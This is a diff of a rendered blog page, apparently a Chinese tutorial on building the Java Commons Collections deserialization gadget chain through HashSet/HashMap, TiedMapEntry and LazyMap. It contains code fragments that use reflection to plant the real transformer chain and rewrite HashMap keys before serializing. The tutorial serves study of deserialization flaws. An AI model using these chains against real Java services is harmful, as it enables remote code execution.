 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//用反射再改回真的chain
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        Field f <span style="color:#f92672">=</span> ChainedTransformer<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;iTransformers&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>fakeChain<span style="color:#f92672">,</span> transformers<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//清空由于 hashMap.put 对 LazyMap 造成的影响
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        lazyMap<span style="color:#f92672">.</span><span style="color:#a6e22e">clear</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//用反射再改回真的chain</span>
+</span></span><span style="display:flex;"><span>        Field f <span style="color:#f92672">=</span> ChainedTransformer.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;iTransformers&#34;</span>);
+</span></span><span style="display:flex;"><span>        f.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        f.<span style="color:#a6e22e">set</span>(fakeChain, transformers);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//清空由于 hashMap.put 对 LazyMap 造成的影响</span>
+</span></span><span style="display:flex;"><span>        lazyMap.<span style="color:#a6e22e">clear</span>();
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        SeralizeUtil<span style="color:#f92672">.</span><span style="color:#a6e22e">writeObjectToFile</span><span style="color:#f92672">(</span>set<span style="color:#f92672">,</span> fileName<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        SeralizeUtil<span style="color:#f92672">.</span><span style="color:#a6e22e">readFileObject</span><span style="color:#f92672">(</span>fileName<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        SeralizeUtil.<span style="color:#a6e22e">writeObjectToFile</span>(set, fileName);
+</span></span><span style="display:flex;"><span>        SeralizeUtil.<span style="color:#a6e22e">readFileObject</span>(fileName);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>可以看到，<code>HashSet</code>和<code>HashMap</code>的调用原理区别不大，都是通过反序列化过程的<code>put</code>(实际上就是<code>HashMap</code>的<code>putValue</code>)方法，从而触发<code>hashcode</code>，进一步<code>get</code>触发<code>LazyMap</code>。</p>
@@ -652,8 +652,8 @@
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>TiedMapEntry entry   <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TiedMapEntry<span style="color:#f92672">(</span>lazyMap<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;reus09&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>hashMap<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span>entry<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;reus&#34;</span><span style="color:#f92672">);</span>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>TiedMapEntry entry   <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TiedMapEntry(lazyMap, <span style="color:#e6db74">&#34;reus09&#34;</span>);
+</span></span><span style="display:flex;"><span>hashMap.<span style="color:#a6e22e">put</span>(entry, <span style="color:#e6db74">&#34;reus&#34;</span>);
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>hashMap在<code>put</code>的时候，会调用<code>hash(key)</code>，触发我们实现好的lazyMap利用链，从而将<code>reus09</code>这个key存储到<code>lazyMap</code>里面，这就会导致我们反序列化的时候，进入<code>lazyMap#get</code>方法的时候，会查询到已经存储的这个key,从而无法进入<code>transform()</code>代码块。</p>
@@ -689,18 +689,18 @@
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>hashMap<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span><span style="color:#ae81ff">1</span><span style="color:#f92672">,</span><span style="color:#ae81ff">1</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>Field hashMapTableField <span style="color:#f92672">=</span> hashMap<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;table&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>hashMapTableField<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>Object<span style="color:#f92672">[]</span> array <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Object<span style="color:#f92672">[])</span> hashMapTableField<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>hashMap<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>Object node <span style="color:#f92672">=</span> array<span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">];</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>node <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">){</span>
-</span></span><span style="display:flex;"><span>    node <span style="color:#f92672">=</span> array<span style="color:#f92672">[</span><span style="color:#ae81ff">1</span><span style="color:#f92672">];</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>hashMap.<span style="color:#a6e22e">put</span>(1,1);
+</span></span><span style="display:flex;"><span>Field hashMapTableField <span style="color:#f92672">=</span> hashMap.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;table&#34;</span>);
+</span></span><span style="display:flex;"><span>hashMapTableField.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>Object<span style="color:#f92672">[]</span> array <span style="color:#f92672">=</span> (Object<span style="color:#f92672">[]</span>) hashMapTableField.<span style="color:#a6e22e">get</span>(hashMap);
+</span></span><span style="display:flex;"><span>Object node <span style="color:#f92672">=</span> array<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(node <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>){
+</span></span><span style="display:flex;"><span>    node <span style="color:#f92672">=</span> array<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Field keyField <span style="color:#f92672">=</span> node<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;key&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>keyField<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>keyField<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>node<span style="color:#f92672">,</span>entry<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>Field keyField <span style="color:#f92672">=</span> node.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;key&#34;</span>);
+</span></span><span style="display:flex;"><span>keyField.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>keyField.<span style="color:#a6e22e">set</span>(node,entry);
 </span></span></code></pre></td></tr></table>
 </div>
 </div></li>
